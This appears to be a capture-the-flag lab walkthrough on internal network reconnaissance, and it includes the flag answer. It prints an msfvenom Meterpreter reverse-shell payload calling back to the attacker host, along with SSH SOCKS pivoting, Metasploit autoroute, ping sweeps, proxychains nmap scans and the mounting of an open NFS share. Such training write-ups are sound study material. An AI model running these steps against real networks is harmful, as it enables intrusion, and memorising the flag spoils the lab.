# Internal Information Gathering
## Questions
1. Mount an NFS share and find a flag.txt file. Submit the contents as your answer. **Answer: bf22a1d0acfca4af517e1417a80e92d1**
   - Enable port-forwarding to enumerate internal network:
        Using SSH:
        ```shellsession
        $ cat /etc/proxychains.conf | grep socks4
        socks4 	127.0.0.1 9050
        $ ssh -D 9050 -i id_rsa root@10.129.119.179
        ```
        Using metasploit:
        ```shellsession
        $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.15.233 LPORT=8443 -f elf > shell.elf
        $ scp -i id_rsa shell.elf root@10.129.119.179:/tmp
        $ sudo msfconsole -q
        [msf](Jobs:0 Agents:0) >> use exploit/multi/handler
        [*] Using configured payload generic/shell_reverse_tcp
        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x86/meterpreter/reverse_tcp
        payload => linux/x86/meterpreter/reverse_tcp
        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 10.10.15.233
        lhost => 10.10.15.233
        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 8443
        lport => 8443
        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit
        [*] Started reverse TCP handler on 10.10.15.233:8443 
        [*] Sending stage (1062760 bytes) to 10.129.119.179
        [*] Meterpreter session 1 opened (10.10.15.233:8443 -> 10.129.119.179:48022) at 2026-07-23 06:22:39 -0400

        (Meterpreter 1)(/root) > 
        ```
        On target machine, execute the `shell.elf` script:
        ```shellsession
        root@dmz01:~# chmod +x /tmp/shell.elf 
        root@dmz01:~# /tmp/shell.elf
        ```
        Set up routing:
        ```shellsession
        (Meterpreter 1)(/root) > background
        [*] Backgrounding session 1...
        [msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set SESSION 1
        SESSION => 1
        [msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set subnet 172.16.8.0
        subnet => 172.16.8.0
        [msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run
        [*] Running module against dmz01 (10.129.119.179)
        [*] Searching for subnets to autoroute.
        [+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
        [+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
        [+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
        [+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
        [*] Post module execution completed
        ```
   - Discover live hosts and run nmap scan on them:
        Still in msfconsole, run this ping sweep module:
        ```shellsession
        [msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use post/multi/gather/ping_sweep
        [msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set rhosts 172.16.8.0/23rhosts => 172.16.8.0/23
        [msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set SESSION 1
        SESSION => 1
        [msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> run
        [*] Performing ping sweep for IP range 172.16.8.0/23
        [+] 	172.16.8.3 host found
        [+] 	172.16.8.20 host found
        [+] 	172.16.8.50 host found
        [+] 	172.16.8.120 host found
        ```
        Run nmap scan to identify running services:
        ```shellsession
        $ proxychains nmap --open -iL live_hosts
        Nmap scan report for 172.16.8.3
        Host is up (0.17s latency).
        Not shown: 988 closed tcp ports (conn-refused)
        PORT     STATE SERVICE
        53/tcp   open  domain
        88/tcp   open  kerberos-sec
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        389/tcp  open  ldap
        445/tcp  open  microsoft-ds
        464/tcp  open  kpasswd5
        593/tcp  open  http-rpc-epmap
        636/tcp  open  ldapssl
        3268/tcp open  globalcatLDAP
        3269/tcp open  globalcatLDAPssl
        5985/tcp open  wsman

        Nmap scan report for 172.16.8.20
        Host is up (0.16s latency).
        Not shown: 992 closed tcp ports (conn-refused)
        PORT     STATE SERVICE
        80/tcp   open  http
        111/tcp  open  rpcbind
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        445/tcp  open  microsoft-ds
        2049/tcp open  nfs
        3389/tcp open  ms-wbt-server
        5985/tcp open  wsman

        Nmap scan report for 172.16.8.50
        Host is up (0.16s latency).
        Not shown: 994 closed tcp ports (conn-refused)
        PORT     STATE SERVICE
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        445/tcp  open  microsoft-ds
        3389/tcp open  ms-wbt-server
        5985/tcp open  wsman
        8080/tcp open  http-proxy

        Nmap scan report for 172.16.8.120
        Host is up (0.17s latency).
        Not shown: 989 closed tcp ports (conn-refused)
        PORT     STATE SERVICE
        21/tcp   open  ftp
        22/tcp   open  ssh
        25/tcp   open  smtp
        53/tcp   open  domain
        80/tcp   open  http
        110/tcp  open  pop3
        111/tcp  open  rpcbind
        143/tcp  open  imap
        993/tcp  open  imaps
        995/tcp  open  pop3s
        8080/tcp open  http-proxy

        Nmap done: 4 IP addresses (4 hosts up) scanned in 661.72 seconds
        ```
   - Notice NFS service on target 172.16.8.20, list the share and mount it to read the flag:
        ```shellsession
        root@dmz01:~# showmount -e 172.16.8.20
        Export list for 172.16.8.20:
        /DEV01 (everyone)
        root@dmz01:~# mkdir /tmp/DEV01
        root@dmz01:~# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01/
        root@dmz01:~# cd /tmp/DEV01/
        root@dmz01:/tmp/DEV01# ls
        BuildPackages.bat            CKToolbarSets.xml  WatchersNET.CKEditor.sln
        CKEditorDefaultSettings.xml  DNN
        CKToolbarButtons.xml         flag.txt
        root@dmz01:/tmp/DEV01# cat flag.txt
        ```




